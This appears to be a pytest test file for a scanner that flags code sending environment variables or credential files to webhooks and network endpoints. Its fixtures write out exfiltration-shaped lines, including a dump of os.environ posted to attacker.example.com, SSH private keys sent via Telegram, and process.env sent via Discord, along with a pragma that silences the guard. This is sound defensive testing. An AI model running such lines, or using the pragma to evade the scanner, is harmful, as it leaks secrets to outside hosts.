def test_telegram_bot_token_read_alone_does_not_fire(tmp_path: Path) -> None:
    # FP bait: the source's own disclosed boundary -- a notification helper reading only its
    # own bot token from the environment, with no full dump and no credential file, is silent.
    (tmp_path / "notify.py").write_text(
        "import requests\n"
        "token = os.environ['TELEGRAM_BOT_TOKEN']\n"
        "requests.post(f'https://api.telegram.org/bot{token}/sendMessage', data={'text': 'ok'})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_discord_notifier_mentioning_npmrc_does_not_fire(tmp_path: Path) -> None:
    # FP fix: .npmrc is deliberately excluded, same reason
    # credential_file_path_reference.py excludes it -- an ordinary, common npm config file
    # mention is not a "well-known credential store" signal. The name is in CODE, not a
    # comment: the guard strips comments, so a comment-only mention proved nothing (round-2 M2).
    (tmp_path / "notify.py").write_text(
        "WEBHOOK = 'https://discord.com/api/webhooks/1/abc'\n"
        "registry = open('.npmrc', encoding='utf-8').read()\n"
        "requests.post(WEBHOOK, json={'content': 'build finished'})\n",
        encoding="utf-8",
    )
    (tmp_path / "release.js").write_text(
        "const WEBHOOK = 'https://discord.com/api/webhooks/1/abc';\n"
        "fs.writeFileSync('.npmrc', `//registry.npmjs.org/:_authToken=${tok}`);\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"python", "javascript"}, python_dirs=["."])
    assert EnvironDumpToNetworkGuard().run(tmp_path, profile) == []


def test_telegram_notifier_mentioning_pypirc_does_not_fire(tmp_path: Path) -> None:
    (tmp_path / "notify.py").write_text(
        "import requests\n"
        "token = os.environ['TELEGRAM_BOT_TOKEN']\n"
        "index = configparser.ConfigParser().read(os.path.expanduser('~/.pypirc'))\n"
        "requests.post(f'https://api.telegram.org/bot{token}/sendMessage', data={'text': 'released'})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_telegram_notifier_mentioning_bare_id_rsa_does_not_fire(tmp_path: Path) -> None:
    # A bare `id_rsa` string with no `.ssh/` prefix is not a credential-store reference --
    # matches credential_file_path_reference.py's own anchor requirement.
    (tmp_path / "notify.py").write_text(
        "import requests\n"
        "token = os.environ['TELEGRAM_BOT_TOKEN']\n"
        "# key_name = 'id_rsa'  -- just a label used in an unrelated log message\n"
        "requests.post(f'https://api.telegram.org/bot{token}/sendMessage', data={'text': 'id_rsa rotated'})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_telegram_notifier_with_ssh_id_rsa_path_still_fires(tmp_path: Path) -> None:
    # Narrowing direction check: a REAL .ssh/id_rsa reference alongside a Telegram send must
    # still fire -- only the bare, unanchored id_rsa string was the FP.
    (tmp_path / "grab.py").write_text(
        "import requests\n"
        "key_path = os.path.expanduser('~/.ssh/id_rsa')\n"
        "requests.post('https://api.telegram.org/bot123/sendDocument', data={'path': key_path})\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "environ-dump-to-network/credential-exfil-via-webhook" for f in findings)


def test_webhook_with_built_ssh_private_key_path_fires(tmp_path: Path) -> None:
    # Round-2 M1: the `.ssh/`-prefix anchor dropped the usual path-building idioms.
    (tmp_path / "join.py").write_text(
        "WEBHOOK = 'https://discord.com/api/webhooks/1/abc'\n"
        "key = open(os.path.join(home, '.ssh', 'id_rsa')).read()\n",
        encoding="utf-8",
    )
    (tmp_path / "pathlib_div.py").write_text(
        "WEBHOOK = 'https://discord.com/api/webhooks/1/abc'\n"
        "key = (Path.home() / '.ssh' / 'id_ed25519').read_text()\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["join.py:1", "pathlib_div.py:1"]


def test_webhook_with_ssh_public_key_does_not_fire(tmp_path: Path) -> None:
    # A PUBLIC key is not a credential; credential_file_path_reference.py excludes `.pub` too.
    (tmp_path / "deploy.py").write_text(
        "WEBHOOK = 'https://discord.com/api/webhooks/1/abc'\n"
        "pub = open(os.path.expanduser('~/.ssh/id_rsa.pub')).read()\n"
        "requests.post(WEBHOOK, json={'content': 'deploy key: ' + pub})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_discord_notification_helper_alone_does_not_fire(tmp_path: Path) -> None:
    (tmp_path / "notify.py").write_text(
        "WEBHOOK = 'https://discord.com/api/webhooks/1/abc'\n"
        "requests.post(WEBHOOK, json={'content': 'build finished'})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


# --- docstring self-reference / pragma / applies ------------------------------------------------


def test_docstring_prose_alone_does_not_fire(tmp_path: Path) -> None:
    (tmp_path / "notes.py").write_text(
        '"""Discusses json.dumps(dict(os.environ)), requests.post, api.telegram.org/bot, '
        'sendMessage, discord.com/api/webhooks/, and .aws/credentials, all in prose, with no '
        'real code below."""\n'
        "def run():\n"
        "    return None\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_pragma_silences_all_rules(tmp_path: Path) -> None:
    (tmp_path / "exfil.py").write_text(
        "# security: allow-environ-dump-to-network\n"
        "import json, requests\n"
        "payload = json.dumps(dict(os.environ))\n"
        "requests.post('https://attacker.example.com/collect', data=payload)\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


@pytest.mark.slow
def test_scan_is_linear_on_unclosed_network_calls(tmp_path: Path) -> None:
    # Round-2 M4: every network-send match walked an unclosed call to EOF (one dump plus 2000
    # unclosed `requests.post(` lines: 8.2 s, against 0.008 s at the round-1 code).
    sizes = (250, 500, 1000, 2000)
    guard = EnvironDumpToNetworkGuard()
    files: dict[int, Path] = {}
    for n in sizes:
        d = tmp_path / str(n)
        d.mkdir()
        files[n] = d / "hostile.py"
        files[n].write_text(
            "payload = json.dumps(dict(os.environ))\n" + "requests.post(\n" * n, encoding="utf-8"
        )

    def scan(n: int) -> None:
        guard._scan(files[n].parent, files[n])

    assert_growth(scan, sizes, expected="linear")
    # The work was still done. The file cannot tokenize (unclosed calls), so only the inline check
    # runs (round 6): a dump passed inline in a closed send appended to it still fires.
    files[250].write_text(
        files[250].read_text(encoding="utf-8") + "requests.post(u, data=json.dumps(dict(os.environ)))\n",
        encoding="utf-8",
    )
    assert [f.location for f in guard._scan(files[250].parent, files[250])] == ["hostile.py:252"]


def test_applies_requires_python_js_or_ts(tmp_path: Path) -> None:
    guard = EnvironDumpToNetworkGuard()
    assert guard.applies(mkprofile(tmp_path, features={"python"})) is True
    assert guard.applies(mkprofile(tmp_path, features={"javascript"})) is True
    assert guard.applies(mkprofile(tmp_path, features={"typescript"})) is True
    assert guard.applies(mkprofile(tmp_path, features={"docker"})) is False


# --- #1055: the JS environment dump counts only when it is live code ------------------------------

_JS_DISCORD_SEND = "fetch('https://discord.com/api/webhooks/1/x', {method: 'POST', body: msg});\n"


def _run_js_webhook(tmp_path: Path, first_line: str) -> list[Finding]:
    (tmp_path / "notify.js").write_text(first_line + _JS_DISCORD_SEND, encoding="utf-8")
    return EnvironDumpToNetworkGuard().run(tmp_path, mkprofile(tmp_path, features={"javascript"}))


@pytest.mark.parametrize(
    "first_line",
    [
        # The RCA's CRITICAL FP: the dump spelled out in a warning next to a real webhook.
        "console.warn('never JSON.stringify(process.env) here');\n",
        "console.warn(`never JSON.stringify(process.env) here`);\n",
    ],
)
def test_js_dump_spelled_in_a_string_does_not_feed_the_webhook_rule(tmp_path: Path, first_line: str) -> None:
    assert _run_js_webhook(tmp_path, first_line) == []


@pytest.mark.parametrize(
    "first_line",
    [
        "const msg = JSON.stringify(process.env);\n",
        # The real dump nested in a `${...}` substitution is code: the shortcut-separating case.
        "const msg = `${JSON.stringify(process.env)}`;\n",
        # A quoted copy earlier on the line must not hide the real dump after it.
        "log('JSON.stringify(process.env) is bad'); const msg = JSON.stringify(process.env);\n",
        # The credential-store path is a literal by nature and still counts as the exfil signal.
        "const p = home + '/.aws/credentials';\n",
    ],
)
def test_js_real_dump_still_feeds_the_webhook_rule(tmp_path: Path, first_line: str) -> None:
    findings = _run_js_webhook(tmp_path, first_line)
    assert [f.rule for f in findings] == ["environ-dump-to-network/credential-exfil-via-webhook"]
    assert findings[0].location.replace("\\", "/").endswith("notify.js:2")


def test_js_pragma_still_suppresses_a_code_anchored_dump(tmp_path: Path) -> None:
    first_line = "const msg = JSON.stringify(process.env);\n"
    assert len(_run_js_webhook(tmp_path, first_line)) == 1
    assert _run_js_webhook(tmp_path, "// security: allow-environ-dump-to-network\n" + first_line) == []
